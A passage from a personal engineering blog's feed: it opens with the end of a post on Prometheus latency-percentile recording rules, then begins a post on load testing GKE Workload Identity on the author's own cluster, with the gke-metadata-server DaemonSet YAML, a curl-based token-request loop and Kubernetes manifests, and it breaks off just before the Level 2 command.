</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric</span>
</span><span class='line'>  <span class="c1"># `metadata_server_request_durations_bucket` over 5-minute increments and aggregate all</span>
</span><span class='line'>  <span class="c1"># labels. We must aggregate here instead of in Grafana because averaging percentiles doesn’t</span>
</span><span class='line'>  <span class="c1"># work. To compute a percentile, you need the original population of events. The math is just</span>
</span><span class='line'>  <span class="c1"># broken. An average of a percentile is meaningless.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over</span>
</span><span class='line'>  <span class="c1"># 5-minute increments for each label combination.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over</span>
</span><span class='line'>  <span class="c1"># 5-minute increments and aggregate all labels. We must aggregate here instead of in Grafana</span>
</span><span class='line'>  <span class="c1"># because averaging percentiles doesn’t work. To compute a percentile, you need the original</span>
</span><span class='line'>  <span class="c1"># population of events. The math is just broken. An average of a percentile is meaningless.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to <a href="https://twitter.com/mikedanese">@mikedanese</a> for the intial idea of using <code>socat</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[3 Levels of Load Testing GKE Workload Identity]]></title>
    <link href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/"/>
    <updated>2020-04-01T10:21:11-04:00</updated>
    <id>https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity</id>
    <content type="html"><![CDATA[<p>I manage multitenant <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a> (GKE) clusters for stateless backend services at
work. Google recently graduated GKE&rsquo;s <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a> (WI) feature to generally available
(GA). When my team used WI during its beta stage, it seemed to fail when there were more than 16
requests per second (RPS) on one GKE node to retrieve Google access tokens.</p>

<p>Before we knew about this low RPS failure threshold, we told many internal engineering teams
to go ahead and use the feature. In hindsight, we should&rsquo;ve load-tested the feature before making it
generally available internally especially since it wasn&rsquo;t even GA publicly.</p>

<p>My efforts to load test WI have grown more sophisticated over time. This post describes the
progression. It&rsquo;s like the &ldquo;4 Levels of &hellip;&rdquo; <a href="https://www.youtube.com/playlist?list=PLz3-p2q6vFYUDvVUu_aPhGUV-3ROIa6d2">Epicurious Youtube videos</a>. The goal here is to find
out at what RPS WI starts to fail and to try to learn some generalizable lessons from load testing
vendor-managed services.</p>

<h3>tl;dr lessons learned</h3>

<ul>
<li>always load test new features above and beyond what you expect your production load will be</li>
<li>use proper load testing tools and not bash for loops</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>4 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<h2>High level of what Workload Identity is and how it works</h2>

<p>Workloads on GKE often need to access GCP resources like PubSub or CloudSQL.
In order to do so, your workload needs to use a Google Service Account (GSA) key that is authorized to
access those resources. So you end up creating keys for all your GSA&rsquo;s and copy-pasting
these keys into Kubernetes Secrets for your workloads. This is insecure and not maintainable if you
are a company that has dozens of engineering teams and hundreds of workloads.</p>

<p>So GCP offered WI which allows a Kubernetes Service Account (KSA) to be associated with a GSA. If a
workload can run with a certain KSA, it&rsquo;ll transparently get the Google access token for the
associated GSA. No manual copy-pasting GSA keys!</p>

<p>How does this work? You have to enable WI on your cluster and node pool. This creates a
<code>gke-metadata-server</code> DaemonSet in the <code>kube-system</code> namespace. <code>gke-metadata-server</code> is the
entrypoint to the whole WI system. Here&rsquo;s a nice <a href="https://www.youtube.com/watch?v=s4NYEJDFc0M">Google Cloud Next conference talk</a> with more
details.</p>

<p><code>gke-metadata-server</code> is the only part of WI that is exposed to GKE users, i.e. runs on machines you
control. It&rsquo;s like the Verizon FiOS box in your basement. You control your house, but there&rsquo;s a
little box that Verizon owns and operates in there. All other parts of WI run on GCP infrastructure
that you can&rsquo;t see. When I saw failures with WI, it all seemed to happen in
<code>gke-metadata-server</code>. So that&rsquo;s what I&rsquo;ll load test.</p>

<p>Here&rsquo;s the <code>gke-metadata-server</code> DaemonSet YAML for reference. As of the time of this writing the
image is <code>gke.gcr.io/gke-metadata-server:20200218_1145_RC0</code>. You might see different behavior with
different images.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apiVersion: extensions/v1beta1
</span><span class='line'>kind: DaemonSet
</span><span class='line'>metadata:
</span><span class='line'>  creationTimestamp: "2019-10-15T17:04:40Z"
</span><span class='line'>  generation: 8
</span><span class='line'>  labels:
</span><span class='line'>    addonmanager.kubernetes.io/mode: Reconcile
</span><span class='line'>    k8s-app: gke-metadata-server
</span><span class='line'>  name: gke-metadata-server
</span><span class='line'>  namespace: kube-system
</span><span class='line'>  resourceVersion: "138588210"
</span><span class='line'>  selfLink: /apis/extensions/v1beta1/namespaces/kube-system/daemonsets/gke-metadata-server
</span><span class='line'>  uid: e06885d8-ef6d-11e9-88c9-42010a8c0110
</span><span class='line'>spec:
</span><span class='line'>  revisionHistoryLimit: 10
</span><span class='line'>  selector:
</span><span class='line'>    matchLabels:
</span><span class='line'>      k8s-app: gke-metadata-server
</span><span class='line'>  template:
</span><span class='line'>    metadata:
</span><span class='line'>      annotations:
</span><span class='line'>        components.gke.io/component-name: gke-metadata-server
</span><span class='line'>        components.gke.io/component-version: 0.2.21
</span><span class='line'>        scheduler.alpha.kubernetes.io/critical-pod: '"''"'
</span><span class='line'>      creationTimestamp: null
</span><span class='line'>      labels:
</span><span class='line'>        addonmanager.kubernetes.io/mode: Reconcile
</span><span class='line'>        k8s-app: gke-metadata-server
</span><span class='line'>    spec:
</span><span class='line'>      containers:
</span><span class='line'>      - command:
</span><span class='line'>        - /gke-metadata-server
</span><span class='line'>        - --logtostderr
</span><span class='line'>        - --token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken
</span><span class='line'>        - --identity-namespace=[redacted].svc.id.goog
</span><span class='line'>        - --identity-provider-id=https://container.googleapis.com/v1/projects/[redacted]/locations/asia-east1/clusters/[redacted]
</span><span class='line'>        - --passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller
</span><span class='line'>        - --attributes=cluster-name=[redacted],cluster-uid=[redacted],cluster-location=asia-east1
</span><span class='line'>        - --enable-identity-endpoint=true
</span><span class='line'>        - --cluster-uid=[redacted]
</span><span class='line'>        image: gke.gcr.io/gke-metadata-server:20200218_1145_RC0
</span><span class='line'>        imagePullPolicy: IfNotPresent
</span><span class='line'>        livenessProbe:
</span><span class='line'>          failureThreshold: 3
</span><span class='line'>          httpGet:
</span><span class='line'>            host: 127.0.0.1
</span><span class='line'>            path: /healthz
</span><span class='line'>            port: 54898
</span><span class='line'>            scheme: HTTP
</span><span class='line'>          initialDelaySeconds: 10
</span><span class='line'>          periodSeconds: 10
</span><span class='line'>          successThreshold: 1
</span><span class='line'>          timeoutSeconds: 1
</span><span class='line'>        name: gke-metadata-server
</span><span class='line'>        resources:
</span><span class='line'>          limits:
</span><span class='line'>            cpu: 100m
</span><span class='line'>            memory: 100Mi
</span><span class='line'>          requests:
</span><span class='line'>            cpu: 100m
</span><span class='line'>            memory: 100Mi
</span><span class='line'>        securityContext:
</span><span class='line'>          privileged: true
</span><span class='line'>        terminationMessagePath: /dev/termination-log
</span><span class='line'>        terminationMessagePolicy: File
</span><span class='line'>        volumeMounts:
</span><span class='line'>        - mountPath: /var/lib/kubelet/kubeconfig
</span><span class='line'>          name: kubelet-credentials
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /var/lib/kubelet/pki/
</span><span class='line'>          name: kubelet-certs
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /var/run/
</span><span class='line'>          name: container-runtime-interface
</span><span class='line'>        - mountPath: /etc/srv/kubernetes/pki
</span><span class='line'>          name: kubelet-pki
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /etc/ssl/certs/
</span><span class='line'>          name: ca-certificates
</span><span class='line'>          readOnly: true
</span><span class='line'>      dnsPolicy: Default
</span><span class='line'>      hostNetwork: true
</span><span class='line'>      nodeSelector:
</span><span class='line'>        beta.kubernetes.io/os: linux
</span><span class='line'>        iam.gke.io/gke-metadata-server-enabled: "true"
</span><span class='line'>      priorityClassName: system-node-critical
</span><span class='line'>      restartPolicy: Always
</span><span class='line'>      schedulerName: default-scheduler
</span><span class='line'>      securityContext: {}
</span><span class='line'>      serviceAccount: gke-metadata-server
</span><span class='line'>      serviceAccountName: gke-metadata-server
</span><span class='line'>      terminationGracePeriodSeconds: 30
</span><span class='line'>      tolerations:
</span><span class='line'>      - effect: NoExecute
</span><span class='line'>        operator: Exists
</span><span class='line'>      - effect: NoSchedule
</span><span class='line'>        operator: Exists
</span><span class='line'>      volumes:
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/lib/kubelet/pki/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: kubelet-certs
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/lib/kubelet/kubeconfig
</span><span class='line'>          type: File
</span><span class='line'>        name: kubelet-credentials
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/run/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: container-runtime-interface
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /etc/srv/kubernetes/pki/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: kubelet-pki
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /etc/ssl/certs/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: ca-certificates
</span><span class='line'>  templateGeneration: 8
</span><span class='line'>  updateStrategy:
</span><span class='line'>    rollingUpdate:
</span><span class='line'>      maxUnavailable: 1
</span><span class='line'>    type: RollingUpdate</span></code></pre></td></tr></table></div></figure>


<h2>Level 1</h2>

<p>What kind of load am I putting on <code>gke-metadata-server</code>? Since this DaemonSet exists to give out
Google access tokens, I&rsquo;ll send it HTTP requests asking for such tokens.</p>

<p>I built a Docker image with the following <code>Dockerfile</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>FROM google/cloud-sdk
</span><span class='line'>ENTRYPOINT while true; do for i in {1..20}; do curl -X GET https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$(gcloud auth print-access-token) & done; wait; done;</span></code></pre></td></tr></table></div></figure>


<p>Then I created the following K8s Deployment YAML.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">K8S_NAMESPACE</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">replicas</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">7</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">nodeSelector</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">kubernetes.io/hostname</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">NODE-NAME</span><span class="p-Indicator">]</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">my-docker-image</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">workload-identity-test</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran seven of these Pods on a single node (see the <code>nodeSelector</code> above) to target a single
instance of <code>gke-metadata-server</code>.</p>

<p>This isn&rsquo;t a great test because there&rsquo;s a lot of extra work performed by the Container in running
<code>gcloud</code> to print a Google access token (there may be bottlenecks in this <code>gcloud</code> command itself
which is Python code), curling the <code>googleapis.com</code> endpoint to get the token info (originally done
to verify the token was valid). And there&rsquo;s probably bottlenecks in using a shell to do this. All in
all, this implementation doesn&rsquo;t really let you specify a fixed RPS. You&rsquo;re at the mercy of how fast
your Container, shell, gcloud, and the network will let you execute this. I also wasn&rsquo;t able to run
more Pods on a single node because I was hitting the max 32 pods per node limit. There were already
a bunch of other GKE-system level workloads like Calico that took up node capacity.</p>

<h2>Level 2</h2>

<p>Apply this one Pod</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -</span>
</span><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Pod</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">K8S_NAMESPACE</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">google/cloud-sdk</span>
</span><span class='line'>    <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>    <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span> <span class="s">&#39;/bin/bash&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;-c&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;--&#39;</span> <span class="p-Indicator">]</span>
</span><span class='line'>    <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span> <span class="s">&#39;while</span><span class="nv"> </span><span class="s">true;</span><span class="nv"> </span><span class="s">do</span><span class="nv"> </span><span class="s">sleep</span><span class="nv"> </span><span class="s">30;</span><span class="nv"> </span><span class="s">done;&#39;</span> <span class="p-Indicator">]</span>
</span><span class='line'>    <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">allowPrivilegeEscalation</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>      <span class="l-Scalar-Plain">privileged</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>      <span class="l-Scalar-Plain">readOnlyRootFilesystem</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'>    <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2</span>
</span><span class='line'>        <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">4G</span>
</span><span class='line'>      <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2</span>
</span><span class='line'>        <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">4G</span>
</span><span class='line'><span class="l-Scalar-Plain">EOF</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then <code>kubectl exec</code> in and run this command.</p>

